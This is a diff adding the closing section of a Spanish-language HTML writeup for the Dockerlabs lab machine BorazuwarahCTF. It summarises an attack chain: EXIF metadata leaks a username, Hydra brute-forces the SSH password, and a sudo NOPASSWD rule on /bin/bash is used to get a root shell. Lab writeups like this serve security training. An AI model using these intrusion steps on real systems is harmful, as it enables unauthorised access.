+          <li>Subir metadatos descriptivos a una imagen pública es un error real, no solo de CTF: fotos con coordenadas GPS, nombres de equipo o usuarios en los campos EXIF han filtrado información en auditorías y filtraciones del mundo real.</li>
+          <li>La regla <code>NOPASSWD: /bin/bash</code> aparece en <strong>GTFOBins</strong> como una de las escaladas más triviales que existen: cualquier binario que lance una shell y se pueda ejecutar con sudo equivale a tener root.</li>
+        </ul>
+      </div>
+    </div>
+
+    <div class="section" id="resumen">
+      <p class="section-label">// 08</p>
+      <h2 class="section-title">Resumen</h2>
+      <div class="section-line"></div>
+      <div class="prose">
+        <p>nmap descubre SSH (22) y HTTP (80) → el puerto 80 solo sirve una imagen → <code>exiftool</code> revela el usuario <code>borazuwarah</code> en los metadatos (y <code>steghide</code> extrae un señuelo) → Hydra fuerza la contraseña SSH y encuentra <code>123456</code> → con <code>borazuwarah:123456</code> se entra por SSH → <code>sudo -l</code> muestra <code>NOPASSWD: /bin/bash</code> → <code>sudo /bin/bash</code> entrega una shell como root.</p>
+      </div>
+    </div>
+
+  <div class="writeup-nav" aria-label="Navegación entre writeups"><a class="anterior" href="firsthacking.html"><span class="dir">← ANTERIOR</span><span class="nombre">FirstHacking</span></a><a class="siguiente" href="../facil/mirame.html"><span class="dir">SIGUIENTE →</span><span class="nombre">Mírame</span></a></div>
+<section class="relacionados"><h2>// RELACIONADOS POR ETIQUETAS</h2><div class="rel-grid"><a class="rel-card" href="trust.html"><span class="nombre">Trust</span><span class="meta">dockerlabs · muy-facil · Hydra</span></a><a class="rel-card" href="obsession.html"><span class="nombre">Obsession</span><span class="meta">dockerlabs · muy-facil · Hydra</span></a><a class="rel-card" href="breakmyssh.html"><span class="nombre">BreakMySSH</span><span class="meta">dockerlabs · muy-facil · SSH</span></a></div></section>
+</main>
+</div>
+<footer>
+  <p>© 2026 <span>Brandon Zevallos Pastrana</span> — Writeup de BorazuwarahCTF · Dockerlabs</p>
+  <p>Hecho con <span>kali linux</span> &amp; <span>❤</span></p>
+</footer>
+<script>
+  // REVELADO, PROGRESO Y COPIAR (el cursor lo gestiona assets/cursor.js)
+  const obs = new IntersectionObserver(es => es.forEach(e => { if (e.isIntersecting) e.target.classList.add('visible'); }), { threshold: 0.06 });
+  document.querySelectorAll('.section').forEach(s => obs.observe(s));
+  const seccionesTOC = document.querySelectorAll('.section[id]');
+  const enlacesTOC = document.querySelectorAll('.toc-list a');
+  const tocObs = new IntersectionObserver(es => es.forEach(e => {
+    if (e.isIntersecting) {
+      enlacesTOC.forEach(a => a.classList.remove('active'));
+      const act = document.querySelector('.toc-list a[href="#' + e.target.id + '"]');
+      if (act) act.classList.add('active');
+    }
+  }), { rootMargin: '-30% 0px -60% 0px' });
+  seccionesTOC.forEach(s => tocObs.observe(s));
+  window.addEventListener('scroll', () => {
+    const h = document.documentElement.scrollHeight - window.innerHeight;
+    const b = document.getElementById('readingProgress');
+    if (b) b.style.width = (h > 0 ? (document.documentElement.scrollTop / h) * 100 : 0) + '%';
+  });
+  function showToast(m) {
+    let t = document.querySelector('.toast');
+    if (!t) { t = document.createElement('div'); t.className = 'toast'; document.body.appendChild(t); }
+    t.textContent = '📋 ' + m; t.classList.add('show');
+    setTimeout(() => t.classList.remove('show'), 2000);
+  }
+  function copyCmd(btn) {
+    const cmd = btn.closest('.cmd-block').dataset.cmd || '';
+    navigator.clipboard.writeText(cmd).then(() => { btn.textContent = '✓ OK'; btn.classList.add('copied'); showToast('Comando copiado ✓'); setTimeout(() => { btn.textContent = 'COPIAR'; btn.classList.remove('copied'); }, 1800); });
+  }
+</script>
+<script>window.__datos = {};</script>
+<script src="../../../assets/cursor.js" defer></script>
+<script src="../../../assets/writeup.js" defer></script>
+</body>
+</html>
